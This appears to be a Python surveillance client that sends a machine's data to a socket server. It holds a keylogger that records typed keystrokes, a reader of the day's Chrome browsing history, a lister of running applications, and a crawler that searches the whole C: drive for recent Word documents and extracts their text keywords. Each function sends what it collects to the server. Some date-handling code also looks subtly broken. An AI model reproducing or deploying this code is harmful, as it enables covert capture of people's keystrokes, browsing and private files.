import win32com.client
import subprocess
from browser_history.browsers import Chrome
import datetime
from googletrans import Translator
from bs4 import BeautifulSoup
import requests
import keyboard
from socket import *
import os
import docx
from rake_nltk import Rake
from threading import Timer, Thread

sock = socket(AF_INET,SOCK_STREAM)
sock.connect(("localhost",55000))

visited_websites = []
user_id = ""

def get_buffer(data):
    length = len(data)
    count = 0

    while length != 0:
        length = int(length/10)
        count+=1

    buffer = (5-count)*'0' + f'{len(data)}'
    return buffer

buffer = sock.recv(5).decode()
data = sock.recv(int(buffer))
print(data.decode())
password = input()

buffer = get_buffer(password)
sock.send(buffer.encode())
sock.send(password.encode())

buffer = sock.recv(5).decode()
user_id = sock.recv(int(buffer)).decode()


def convert_to_human_time(dtmDate):
    strDateTime = ""
    
    if dtmDate[6] == 0:
        strDateTime = f"{dtmDate[7]}/"
    else:
        strDateTime = f"{dtmDate[6]}{dtmDate[7]}/"

    if dtmDate[4] == 0:
        strDateTime = f"{strDateTime}{dtmDate[5]}/"
    else:
        first_segment = f"{strDateTime}{dtmDate[4]}{dtmDate[5]}/"
        second_segment = f"{dtmDate[0]}{dtmDate[1]}{dtmDate[2]}{dtmDate[3]} {dtmDate[8]}{dtmDate[9]}:{dtmDate[10]}{dtmDate[11]}"
        strDateTime = f"{first_segment}{second_segment}"
    
    return strDateTime

def get_logon_logoff():
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer, "root\cimv2")
    colItems = objSWbemServices.ExecQuery(
        "SELECT * FROM Win32_NetworkLoginProfile")

    for objItem in colItems:

        if objItem.LastLogon is not None:
            print(objItem.LastLogon)
            logon = convert_to_human_time(objItem.LastLogon)
            print(f"Last Logon: {logon}")

        if objItem.LastLogoff is not None:
            logoff = convert_to_human_time(objItem.LastLogoff)
            print(f"Last Logoff (Human Readable Format): {logoff}")


def get_running_apps():
    apps = []
    NOT_WANTED_APPS = 'Description-----------Application Frame Host'
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

    for line in proc.stdout:
        
        if line.rstrip() and line.decode().rstrip() not in NOT_WANTED_APPS:
            # only print lines that are not empty
            # decode() is necessary to get rid of the binary string (b')
            # rstrip() to remove `\r\n`
            apps.append(line.decode().rstrip())

    apps = '#'.join(apps)
    buffer = get_buffer(f"new_apps:{user_id}:{apps}")
    sock.send(buffer.encode())
    sock.send(f"new_apps:{user_id}:{apps}".encode())

def get_tabs():
    c = Chrome()
    outputs = c.fetch_history()

    # his is a list of (datetime.datetime, url) tuples
    his = outputs.histories
    websites = []
    today = datetime.datetime.today()
    today = today.strftime("%d/%m/%Y")
    
    for tab in his:
        date = tab[0].strftime('%d/%m/%Y')
        if date == today:
            websites.append(tab[1])
    
    websites = [f"{url}  {get_website_title(url)}" for url in websites]
    websites = ';'.join(websites)

    buffer = get_buffer(f"new_websites>{user_id}>{websites}")
    sock.send(buffer.encode())
    sock.send(f"new_websites>{user_id}>{websites}".encode())
    
def get_website_title(url):    
    # making requests instance
    reqs = requests.get(url)
    
    # using the BeautifulSoup module
    soup = BeautifulSoup(reqs.text, 'html.parser')
    
    return soup.find_all('title')[0].get_text()

def type_trace():
    recorded = keyboard.record(until='enter')
    all_keys = [key.name for key in recorded if key.event_type == "down"]
    all_keys.pop(-1)
    all_keys = ''.join(all_keys)
    all_keys = all_keys.replace('space', ' ')
    all_keys = all_keys.replace('shift', '')
    print(all_keys)

    buffer = get_buffer(f"new_text*{user_id}*{all_keys}")
    sock.send(buffer.encode())
    sock.send(f"new_text*{user_id}*{all_keys}".encode())

def get_word_docs():
    # Initialize an empty list to store the Word documents
    documents = []

    # Set the root directory to search
    root_dir = 'C:\\'  # This will search the entire file system

    # Search for Word documents in all subdirectories of the root directory
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            if file.endswith('.docx'):
                file_path = os.path.join(root, file)
                modified_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
                documents.append((file_path, modified_time))

    new_docs = []

    # Print the list of Word documents and their modified dates
    time_threshold = datetime.datetime.now() - datetime.timedelta(days=7)  # 7 days
    for document, modified_time in documents:
        if modified_time > time_threshold:
            new_docs.append(document)

    for doc in new_docs:
        print(doc)

    get_word_text(new_docs[-1])


def get_word_text(doc):
    # Open the Word document
    document = docx.Document(doc)

    # Extract the text from the document
    text = []
    for paragraph in document.paragraphs:
        text.append(paragraph.text)

    # Print the extracted text
    new_text = '\n'.join(text)

    translator = Translator()
    try:
        new_text = translator.translate(new_text).text

        new_text = str(new_text)            
    except:
        pass

    r = Rake()
    r.extract_keywords_from_text(new_text)
    new_words = ' '.join(r.get_ranked_phrases())
    print(new_words)

    buffer = get_buffer(f"new_text*{user_id}*{new_words}")
    sock.send(buffer.encode())
    sock.send(f"new_text*{user_id}*{new_words}".encode())

get_tabs()

# def task(message):
#     # report the custom message
#     print(message)

# def new_task():
#     print('yo yo')
# # create a thread timer object

# def run_threads():
#     while True:
#         timer1 = Timer(4, task, args=('Hello world',))
#         timer1.start()
#         timer1.cancel()
#         # timer2 = Timer(2, new_task)
#         # timer2.start()

# thread = Thread(target=run_threads)
# thread.start()
# # wait for the timer to finish
# print('Waiting for the timer...')




